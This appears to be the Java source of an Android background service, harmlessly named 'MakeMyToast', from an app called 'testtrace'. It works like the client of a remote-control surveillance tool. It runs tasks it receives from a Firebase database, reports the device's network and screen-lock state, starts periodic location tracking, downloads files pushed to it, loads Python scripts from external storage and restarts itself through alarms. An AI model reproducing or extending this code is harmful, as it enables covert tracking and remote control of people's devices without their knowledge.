package com.reiserx.testtrace.Service;

import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.ComponentCallbacks2;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Process;
import android.util.Log;

import androidx.annotation.NonNull;

import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.reiserx.testtrace.BuildConfig;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Classes.checkDatabase;
import com.reiserx.testtrace.LocationFiles.periodicLocation;
import com.reiserx.testtrace.Models.Task;
import com.reiserx.testtrace.Models.networkState;
import com.reiserx.testtrace.Models.uploadModel;
import com.reiserx.testtrace.Operations.DownloadUploadedData;
import com.reiserx.testtrace.Operations.getCurrentTask;
import com.reiserx.testtrace.Receivers.AlarmReceiver;
import com.reiserx.testtrace.Utilities.networkUtils;

import java.util.Calendar;


public class MakeMyToast extends Service {

    public boolean ServiceStatus = false;
    ValueEventListener SERVICE_STATUS_LISTENER;
    ValueEventListener TASK_LISTENER;

    String TAG = "MakeMyToastService.logs";

    @Override
    public void onCreate() {
        HandlerThread thread = new HandlerThread("ServiceStartArguments",
                Process.THREAD_PRIORITY_BACKGROUND);
        thread.start();
        Log.e(TAG, "onCreate");
        if (!Python.isStarted()) {
            Python.start(new AndroidPlatform(this));
        }
        String file = Environment.getExternalStorageDirectory() + "/ReiserX";
        Python python = Python.getInstance();
        python.getModule("sys").get("path").callAttr("append", file);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (getMemory()) {
            //Firebase initialization
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this);
            }
            FirebaseDatabase mdb = FirebaseDatabase.getInstance();
            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
            String userID = save.getString("UserID", "");
            try {

                if (userID != null) {
                    DatabaseReference statusRef = mdb.getReference("Main").child(userID).child("ServiceStatus").child("Status");
                    if (SERVICE_STATUS_LISTENER != null) {
                        statusRef.removeEventListener(SERVICE_STATUS_LISTENER);
                    }
                    SERVICE_STATUS_LISTENER = statusRef.addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            ServiceStatus = false;
                            if (snapshot.exists()) {
                                String value = snapshot.getValue(String.class);
                                if (value != null && value.equals("Online")) {
                                    updatePersistence(userID);
                                    updateScreenLock(userID);
                                    getCurrentTask getCurrentTask = new getCurrentTask(MakeMyToast.this);
                                    DatabaseReference currentTask = mdb.getReference("Main").child(userID).child("ServiceStatus").child("Current task");
                                    currentTask.setValue(String.valueOf(getCurrentTask.get()));
                                    mdb.getReference("Main").child(userID).child("ServiceStatus").child("version").setValue(BuildConfig.VERSION_NAME);
                                    DatabaseReference taskRef = mdb.getReference("Main").child(userID).child("Task");

                                    downloadFiles(userID);

                                    if (TASK_LISTENER != null) {
                                        taskRef.removeEventListener(TASK_LISTENER);
                                    }
                                    TASK_LISTENER = taskRef.addValueEventListener(new ValueEventListener() {
                                        @Override
                                        public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                                            if (dataSnapshot.exists()) {
                                                try {
                                                    Task task = dataSnapshot.getValue(Task.class);
                                                    if (task != null) {
                                                        checkDatabase checkDatabase;
                                                        if (task.subTask != null) {
                                                            checkDatabase = new checkDatabase(MakeMyToast.this, task.task, task.requestCode, userID, FirebaseDatabase.getInstance(), FirebaseStorage.getInstance(), task.subTask, FirebaseFirestore.getInstance());
                                                        } else {
                                                            checkDatabase = new checkDatabase(MakeMyToast.this, task.task, task.requestCode, userID, FirebaseDatabase.getInstance(), FirebaseStorage.getInstance(), FirebaseFirestore.getInstance());
                                                        }
                                                        checkDatabase.checkDatabases();

                                                        mdb.getReference("Main").child(userID).child("Task").removeValue().addOnSuccessListener(unused -> {
                                                            if (task.requestCode == 4) {
                                                                mdb.getReference("Main").child(userID).child("Upload").child("Upload service").setValue("finished");
                                                            }
                                                        });
                                                    }
                                                } catch (Exception e) {
                                                    ExceptionHandler exceptionHandler = new ExceptionHandler(e, userID);
                                                    exceptionHandler.upload();
                                                }
                                            }
                                        }

                                        @Override
                                        public void onCancelled(@NonNull DatabaseError error) {
                                            // Failed to read value
                                            Log.w(TAG, "Failed to read value.", error.toException());
                                        }
                                    });
                                }
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });
                    DatabaseReference reference = mdb.getReference("Main").child(userID).child("ServiceStatus").child("Periodic location");
                    reference.addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()) {
                                boolean status = snapshot.getValue(boolean.class);
                                if (status) {
                                    periodicLocation periodicLocation = new periodicLocation(MakeMyToast.this, FirebaseFirestore.getInstance(), userID);
                                    periodicLocation.periodice();
                                }
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });
                }
            } catch (Exception e) {
                ExceptionHandler exceptionHandler = new ExceptionHandler(e, userID);
                exceptionHandler.upload();
            }
        }
        return START_STICKY;
    }

    public void onTrimMemory(int level) {

        // Determine which lifecycle or system event was raised.
        switch (level) {
            case ComponentCallbacks2.TRIM_MEMORY_UI_HIDDEN:

                /*
                   Release any UI objects that currently hold memory.

                   The user interface has moved to the background.
                */

                break;

            case ComponentCallbacks2.TRIM_MEMORY_RUNNING_MODERATE:
            case ComponentCallbacks2.TRIM_MEMORY_RUNNING_LOW:
            case ComponentCallbacks2.TRIM_MEMORY_RUNNING_CRITICAL:

                updateStatus();
                Log.d(TAG, "low");
                Intent in = new Intent(this, MakeMyToast.class);
                this.stopService(in);

                /*
                   Release any memory that your app doesn't need to run.

                   The device is running low on memory while the app is running.
                   The event raised indicates the severity of the memory-related event.
                   If the event is TRIM_MEMORY_RUNNING_CRITICAL, then the system will
                   begin killing background processes.
                */

                break;

            case ComponentCallbacks2.TRIM_MEMORY_BACKGROUND:
            case ComponentCallbacks2.TRIM_MEMORY_MODERATE:
            case ComponentCallbacks2.TRIM_MEMORY_COMPLETE:

                updateStatus();
                Log.d(TAG, "high");
                Intent ins = new Intent(this, MakeMyToast.class);
                this.stopService(ins);

                /*
                   Release as much memory as the process can.

                   The app is on the LRU list and the system is running low on memory.
                   The event raised indicates where the app sits within the LRU list.
                   If the event is TRIM_MEMORY_COMPLETE, the process will be one of
                   the first to be terminated.
                */

                break;

            default:
                /*
                  Release any non-critical data structures.

                  The app received an unrecognized memory level value
                  from the system. Treat this as a generic low-memory message.
                */
                break;
        }
    }

    @Override
    public void onTaskRemoved(Intent intent) {

        sendBroadcast(new Intent("AlarmService"));
        AlarmReceiver alarm = new AlarmReceiver();
        alarm.setAlarm(this);
    }

    @Override
    public void onLowMemory() {
        super.onLowMemory();
        if (getMemory()) {
        } else {
            updateStatus();
            Log.d(TAG, "onLowMemory");
            Intent in = new Intent(this, MakeMyToast.class);
            this.stopService(in);
        }
    }

    private void updateStatus() {

        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }
        FirebaseDatabase mdb = FirebaseDatabase.getInstance();
        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
        mdb.getReference("Main").child(save.getString("UserID", "")).child("ServiceStatus").child("Status")
                .setValue("Offline")
                .addOnSuccessListener(aVoid -> {
                });
        mdb.getReference("Main").child(save.getString("UserID", "")).child("ServiceStatus").child("CommandStatus").setValue(false);
    }

    public Boolean getMemory() {

        ActivityManager.MemoryInfo memoryInfo = getAvailableMemory();

        // Do memory intensive work ...
        return !memoryInfo.lowMemory;
    }

    private ActivityManager.MemoryInfo getAvailableMemory() {
        ActivityManager activityManager = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        activityManager.getMemoryInfo(memoryInfo);
        return memoryInfo;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }

        String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
        FirebaseDatabase mdb = FirebaseDatabase.getInstance();
        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
        String userID = save.getString("UserID", "");
        mdb.getReference("Main").child(userID).child("ServiceStatus").child("Offline")
                .setValue(currentTime)
                .addOnSuccessListener(aVoid -> {
                    Log.d(TAG, "onDestroy");
                    sendBroadcast(new Intent("AlarmService"));
                    AlarmReceiver alarm = new AlarmReceiver();
                    alarm.setAlarm(this);
                });
        updateStatus();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding
        return null;
    }

    public void updatePersistence(String userid) {
        DatabaseReference presenceRef = FirebaseDatabase.getInstance().getReference("Main").child(userid).child("ServiceStatus").child("NetworkState");
        String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());

        networkState networkState = new networkState(false, currentTime, "");
        presenceRef.onDisconnect().setValue(networkState);

        networkUtils networkUtils = new networkUtils(this);
        if (networkUtils.getNetwork()) {
            networkState = new networkState(true, currentTime, networkUtils.getNetworkType());
            presenceRef.setValue(networkState);
        } else {
            networkState = new networkState(false, currentTime, "");
            presenceRef.onDisconnect().setValue(networkState);
        }
    }

    public void updateScreenLock(String UserID) {
        DatabaseReference scrnLock = FirebaseDatabase.getInstance().getReference("Main").child(UserID).child("ServiceStatus").child("screenLock");
        KeyguardManager myKM = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        if (myKM.inKeyguardRestrictedInputMode()) {
            scrnLock.setValue(true);
        } else {
            //it is not locked
            scrnLock.setValue(false);
        }
    }

    public void downloadFiles(String UserID) {
        DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("UploadedFiles");
        reference.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot snapshot1 : snapshot.getChildren()) {
                    uploadModel uploadModel = snapshot1.getValue(com.reiserx.testtrace.Models.uploadModel.class);
                    if (uploadModel != null) {
                        Log.d("hgvhbjhj", "start");
                        DownloadUploadedData downloadUploadedData = new DownloadUploadedData(uploadModel.getStoragePath(), uploadModel.getPath(), uploadModel.getFileUrl(), UserID, reference.child(snapshot1.getKey()));
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {

            }
        });
    }
}